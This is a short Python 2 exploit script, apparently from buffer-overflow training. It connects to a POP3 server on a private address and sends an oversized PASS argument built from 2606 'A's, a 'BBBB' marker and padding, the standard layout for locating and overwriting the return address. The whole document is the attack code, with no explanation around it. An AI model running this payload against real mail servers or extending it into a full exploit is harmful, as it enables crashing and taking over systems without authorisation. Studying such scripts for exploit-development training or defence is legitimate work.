#!/usr/bin/python
import socket
bytes = "A" * 2606 + "BBBB" + "C" * (3000 - 2610)
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.109",110))
	r = s.recv(1024)
	print r

	s.send("USER teste\r\n")
	r = s.recv(1024)
	print r

	s.send("PASS "+bytes+"\r\n")
	r = s.recv(1024)
	print r

	s.send("QUIT\r\n")
	r = s.recv(1024)
	print r
except:
	print "Erro ao conectar"
